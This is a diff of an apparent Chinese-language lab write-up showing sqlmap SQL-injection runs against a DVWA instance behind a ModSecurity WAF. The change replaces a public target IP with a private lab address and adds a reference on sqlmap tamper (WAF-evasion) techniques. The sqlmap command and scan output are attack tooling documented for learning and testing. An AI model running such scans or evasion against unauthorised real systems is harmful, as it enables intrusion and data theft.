@@ -328,7 +328,7 @@ $ sqlmap -u "http://192.168.10.66/DVWA/vulnerabilities/brute/?username=admin&pas
 [*] starting at 09:57:00
 
 [09:57:01] [INFO] testing connection to the target URL
-sqlmap got a 302 redirect to 'http://120.114.140.30:80/DVWA/login.php'. Do you want to follow? [Y/n]
+sqlmap got a 302 redirect to 'http://192.168.10.66:80/DVWA/login.php'. Do you want to follow? [Y/n]
 [09:57:12] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
 # 底下這行可以看到偵測到WAF
 [09:57:12] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
@@ -519,8 +519,9 @@ web application technology: Apache 2.4.18
 back-end DBMS: MySQL Unknown
 [21:28:05] [WARNING] HTTP error codes detected during run:
 403 (Forbidden) - 4 times, 404 (Not Found) - 1 times, 414 (Request-URI Too Long) - 637 times
-[21:28:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/120.114.140.30'
+[21:28:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.10.66'
 
 [*] shutting down at 21:28:05
 ```
 > 參考資料: [nginx下安装配置modsecurity waf防火墙（附完整编译、配置、排错、详细规则）](http://f2ex.cn/nginx-installed-configuration-modsecurity-waf/)
+>          [sqlmap针对应用 tamper高级应用](https://www.jianshu.com/p/daf468e7357f)
